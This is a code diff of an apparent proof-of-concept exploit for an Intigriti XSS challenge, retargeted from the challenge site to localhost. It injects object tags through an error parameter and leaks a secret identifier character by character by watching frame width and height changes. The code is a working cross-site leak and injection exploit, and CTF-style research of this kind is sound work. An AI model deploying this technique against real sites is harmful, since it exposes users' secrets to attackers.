@@ -17,11 +17,11 @@
         const alph = "0123456789abcdefghijklmnopqrstuvwxyz~"
         const payload = alph.split('').map(c =>
             `location.hash+/${c}/.source</##/.source+identifier&&++width`
-        ).join('&&')
+        ).join('&&') + ',++height'
 
-        const thisUrl = location.href.replace('http://', 'https://');
-        const top_url = 'https://challenge-0421.intigriti.io/?error=' + encodeURIComponent(
-            `<object style=width:100% name=x data=${thisUrl}></object><object width=0 data=` +
+        const thisUrl = location.href.replace('http://', 'http://');
+        const top_url = 'http://localhost:8000/?error=' + encodeURIComponent(
+            `<object style=width:100% name=x data=${thisUrl}></object><object height=0 width=0 data=` +
             `//${location.host}/empty.html name=lload onload=${payload}></object>`
         );
 
@@ -33,33 +33,26 @@
             throw /stop/
         }
 
-        let lastValue = 0;
+        let lastWidth = 0;
+        let lastHeight = 0;
         let identifier = '';
+        let INTERVAL;
 
         // for performance measurement
         const startTime = Date.now();
 
-        async function watchForWidthChange() {
-            let width;
-            
+        async function watchForHeightChange() {            
             try{
-                width = top.lload.innerWidth;
-            }catch(e){
-                // not loaded yet
-                return setTimeout(watchForWidthChange, 0);
-            }
-
-            if (width !== lastValue) {
-                // not sure why the poc needs to wait here for such a long time
-                // but breaks otherwise (probably some race condition)
-                await sleep(60);
-                width = top.lload.innerWidth;
-                const newWidth = width - lastValue;
-                lastValue = width;
+                let height = top.lload.innerHeight;
+                if (height !== lastHeight) {
+                let width = top.lload.innerWidth;
+                const newWidth = width - lastWidth;
+                lastWidth = width;
+                lastHeight = height;
                 new_char(newWidth - 1);
-            }else{
-                setTimeout(watchForWidthChange, 20);
             }
+            }catch(e){}
+            setTimeout(watchForHeightChange,0);
         }
 
         function log(identifier) {
@@ -68,7 +61,11 @@
         }
 
         function new_char(d) {
-            let c = alph[d]
+            let c = alph[d];
+            if(c === undefined) {
+                alert("Something broke :(");
+                return;
+            } 
             if (c === '~') {
                 identifier = identifier.slice(0, -1) + alph[alph.search(identifier.slice(-1)) + 1];
                 log(identifier);
@@ -79,7 +76,7 @@
             log(identifier);
             top.location = top_url + '##' + identifier;
             top.lload.location = URL.createObjectURL(new Blob([
-                `<script>onload=top.x.watchForWidthChange<\/script>`
+                `<style>*{background:orange}</style>`
             ], {
                 type: 'text/html'
             }));
@@ -100,7 +97,7 @@
         }
 
         onload = () => {
-            watchForWidthChange();
+            watchForHeightChange();
         }
     </script>
 
